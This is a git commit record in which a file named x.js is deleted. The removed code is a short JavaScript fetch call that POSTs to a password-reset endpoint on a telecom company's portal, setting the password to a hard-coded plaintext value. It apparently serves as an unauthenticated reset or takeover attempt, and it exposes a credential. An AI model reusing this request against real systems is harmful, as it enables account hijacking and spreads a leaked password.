fbbae78dadd71adb7bf443691e43511b1b6e0b0d
Min <132271584+remembermepls@users.noreply.github.com>
2025-07-16 15:11:17 +0900

    Delete x.js

--- x.js
+++
@@ -1,8 +0,0 @@
-fetch('https://nsmd.uplus.co.kr/ptl/loginMgmt/v1/updateNsmdUserPswdRset', {
-  method: 'POST',
-  headers: { 'Content-Type': 'application/json' },
-  body: JSON.stringify({
-    nsmdUserPswd: 'AHNlab2507!',
-    nsmdUserPswdCnfm: 'AHNlab2507!'
-  })
-});
